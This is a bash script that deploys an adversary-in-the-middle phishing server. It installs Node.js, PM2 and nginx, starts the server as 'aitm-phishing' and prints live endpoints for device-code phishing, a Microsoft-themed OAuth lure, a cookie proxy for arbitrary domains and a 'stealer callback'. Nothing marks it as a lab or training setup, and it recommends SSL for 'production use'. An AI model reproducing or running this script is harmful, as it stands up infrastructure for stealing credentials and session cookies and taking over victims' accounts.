#!/bin/bash

echo "🚀 AiTM Phishing Server Deployment Script"
echo "=========================================="

# Update system
echo "📦 Updating system packages..."
sudo apt-get update -y

# Install Node.js 22
echo "📦 Installing Node.js 22..."
curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -
sudo apt-get install -y nodejs

# Install PM2 for process management
echo "📦 Installing PM2..."
sudo npm install -g pm2

# Install dependencies
echo "📦 Installing project dependencies..."
npm install

# Start the server with PM2
echo "🚀 Starting AiTM Phishing Server..."
pm2 start working_server.js --name "aitm-phishing"
pm2 startup
pm2 save

# Install nginx for reverse proxy
echo "📦 Installing nginx..."
sudo apt-get install -y nginx

# Create nginx configuration
echo "⚙️  Configuring nginx reverse proxy..."
sudo tee /etc/nginx/sites-available/aitm-phishing > /dev/null << 'EOF'
server {
    listen 80;
    server_name _;
    
    location / {
        proxy_pass http://localhost:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }
}
EOF

# Enable the site
sudo ln -sf /etc/nginx/sites-available/aitm-phishing /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx

# Get public IP
PUBLIC_IP=$(curl -s http://ipv4.icanhazip.com)

echo ""
echo "✅ DEPLOYMENT COMPLETE!"
echo "======================="
echo ""
echo "🌐 Your AiTM Phishing Server is now live at:"
echo ""
echo "   🎯 Device Code Phishing: http://$PUBLIC_IP/secure-access"
echo "   🎯 OAuth Training:       http://$PUBLIC_IP/microsoft-training"
echo "   🎯 Cookie Proxy:         http://$PUBLIC_IP/cookieproxy/[domain]"
echo "   🎯 Stealer Callback:     http://$PUBLIC_IP/stealer/callback"
echo ""
echo "📊 Server Status: http://$PUBLIC_IP/"
echo ""
echo "🔧 Management Commands:"
echo "   pm2 status              - Check server status"
echo "   pm2 logs aitm-phishing - View logs"
echo "   pm2 restart aitm-phishing - Restart server"
echo ""
echo "⚠️  IMPORTANT: Configure SSL with Let's Encrypt for production use!"
echo "   sudo apt install certbot python3-certbot-nginx"
echo "   sudo certbot --nginx"
echo ""